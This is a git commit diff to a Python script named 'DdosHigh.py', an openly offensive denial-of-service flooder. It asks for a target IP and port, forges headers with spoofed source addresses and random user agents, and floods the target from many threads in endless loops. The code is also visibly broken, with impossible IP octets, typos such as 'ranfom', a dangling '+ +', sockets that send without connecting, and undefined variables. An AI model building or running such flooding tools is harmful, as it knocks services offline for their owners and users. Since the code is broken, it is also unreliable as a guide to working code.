8f925b47e6db34dab441bebe55dce3b8dbde9338
DdosLaster <141035467+DdosLaster@users.noreply.github.com>
2023-09-10 23:02:05 +0700

    Update DdosHigh.py

--- DdosHigh.py
+++ DdosHigh.py
@@ -4,7 +4,6 @@ import time as clock
 import sys
 import socket
 import random
-import requests
 socks2 = [""" 193.662.17.1:443 
 172.108.22.1:443 
 187.234.23.1:80 
@@ -271,7 +270,11 @@ useragents = ["Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 ref= ['http://www.bing.com/search?q=',
 'https://www.ndex.com/ndsearch?text=',
 'https://duckduckgo.com/?q=']
-def spoof1():
+
+ip = str(input("Enter <>> IP >="))
+port = int(input("Enter <>> Port/t >="))
+
+def spoof1(): 
     addr = [192, 168, 0, 1]
     d = '.'
     addr[0] = str(random.randrange(11, 276))
@@ -310,32 +313,28 @@ tp = """This Ddos Credit:ZanGanteng"""
 def TCP():
   global byte1, useragents, socks2, ref
   global time
-  ip = str(input("Enter <>> IP >="))
-  port = int(input("Enter <>> Port/t >="))
-  connection += "pragma: no-cache\r\n"
-  connection += "X-Forwarded-For: " + spoof1() + "\r\n"
-  connection2 += "X-Forwarded-For: " + spoof2() + "\r\n"
-  connection3 += "X-Forwarded-For: " + spoof3() + "\r\n"
-  connect = "Connection : keep-Alive\r\n\r\n"
   Socks = random.choice(socks2)
   useralive = "UserAgents: "+random.choice(useragents)+random.choice(ref)+random.choice(Connection)+random.choice(socks2)+"\r\n"
   reffer = ranfom.choice(ref)
   get_rand = random.choice(['GET','POST',"HEAD"])
   get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
-  byte_ip = get_host + connect + connection + connection2 + connection3 + useralive + reffer + Socks + get_rand + "\r\n"
-  for x in range(20000000):
-         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-         s.send(byte1)
-         s.send(byte1)
-         s.sendall(str.encode(byte_ip))
-         s.sendall(str.encode(byte_ip))
-         print("[SLOT IP1] REQUEST SENDED", [connection])
-         print("SENDED IP1 = ", [x])
-         print("[SLOT IP2] REQUEST SENDED", [connection2])
-         print("SENDED IP2 = ", [x])
-         print("[SLOT IP3] REQUEST SENDED", [connection3])
-         print("SENDED IP3 = ", [x])
-TCP()
-for x in range(port):
+  byte_ip = get_host + + useralive + reffer + Socks + get_rand + "\r\n"
+  while True:
+        try:
+           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+           s.send(byte1)
+           s.send(byte1)
+           s.sendall(str.encode(byte_ip))
+           s.sendall(str.encode(byte_ip))
+           for x in range(20000000):
+              s.send(byte1)
+              s.send(byte1)
+              s.sendall(str.encode(byte_ip))
+              s.sendall(str.encode(byte_ip))
+              print("Sukses")
+        except:
+          s.close()
+          print("Erorr")
+for y in range(port):
   th1 = threading.Thread(target=TCP)
   th1.start()
